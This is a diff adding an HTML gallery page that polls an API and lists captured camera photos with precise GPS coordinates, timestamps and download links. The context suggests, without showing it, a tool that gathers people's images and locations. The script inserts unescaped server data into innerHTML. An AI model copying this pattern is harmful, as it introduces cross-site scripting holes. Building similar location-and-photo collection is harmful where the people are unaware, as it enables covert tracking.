@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Photo Gallery</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: white;
+            text-align: center;
+            padding: 30px 0;
+            font-size: 36px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .back-btn {
+            display: inline-block;
+            background: white;
+            color: #6c5ce7;
+            padding: 12px 30px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-bottom: 20px;
+            transition: 0.3s;
+        }
+        .back-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 25px;
+            padding: 20px 0;
+        }
+        .photo-card {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            transition: 0.3s;
+        }
+        .photo-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.3);
+        }
+        .photo-card img {
+            width: 100%;
+            height: 300px;
+            object-fit: cover;
+            display: block;
+        }
+        .photo-card .info {
+            padding: 15px 20px;
+        }
+        .photo-card .info .location {
+            color: #6c5ce7;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .photo-card .info .time {
+            color: #666;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .photo-card .info .id {
+            color: #999;
+            font-size: 12px;
+            margin-top: 5px;
+            word-break: break-all;
+        }
+        .loading {
+            text-align: center;
+            color: white;
+            font-size: 24px;
+            padding: 50px;
+        }
+        .no-data {
+            text-align: center;
+            color: white;
+            font-size: 24px;
+            padding: 50px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+        }
+        .stats {
+            color: white;
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 20px;
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .download-btn {
+            display: inline-block;
+            background: #00b894;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        .download-btn:hover {
+            background: #00a381;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>📸 Photo Gallery</h1>
+    <a href="/" class="back-btn">← Back to Camera</a>
+    <div class="stats" id="stats">Loading...</div>
+    <div class="photo-grid" id="photoGrid"></div>
+</div>
+
+<script>
+async function loadPhotos() {
+    const grid = document.getElementById('photoGrid');
+    const stats = document.getElementById('stats');
+    
+    grid.innerHTML = '<div class="loading">⏳ Loading photos...</div>';
+    
+    try {
+        const response = await fetch('/api/get-all-data');
+        const result = await response.json();
+        
+        if (!result.success) {
+            grid.innerHTML = `<div class="no-data">❌ Error: ${result.error}</div>`;
+            return;
+        }
+        
+        if (result.count === 0) {
+            grid.innerHTML = '<div class="no-data">📭 No photos found. Capture some first!</div>';
+            stats.textContent = '📭 No photos yet';
+            return;
+        }
+        
+        stats.textContent = `📸 Total ${result.count} photos captured`;
+        grid.innerHTML = '';
+        
+        result.data.forEach((photo, index) => {
+            const card = document.createElement('div');
+            card.className = 'photo-card';
+            
+            const date = new Date(photo.timestamp).toLocaleString('en-IN', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            card.innerHTML = `
+                <img src="${photo.cameraImage}" alt="Photo ${index + 1}" 
+                     onclick="window.open(this.src)" style="cursor:pointer;" />
+                <div class="info">
+                    <div class="location">📍 ${photo.location.lat.toFixed(6)}, ${photo.location.lng.toFixed(6)}</div>
+                    <div class="time">🕐 ${date}</div>
+                    <div class="id">🆔 ${photo._id}</div>
+                    <a href="${photo.cameraImage}" download="photo_${index+1}.jpg" class="download-btn">⬇️ Download</a>
+                </div>
+            `;
+            
+            grid.appendChild(card);
+        });
+        
+    } catch(err) {
+        grid.innerHTML = `<div class="no-data">❌ Error: ${err.message}</div>`;
+    }
+}
+
+// Auto-refresh every 10 seconds
+loadPhotos();
+setInterval(loadPhotos, 10000);
+</script>
+</body>
+</html>
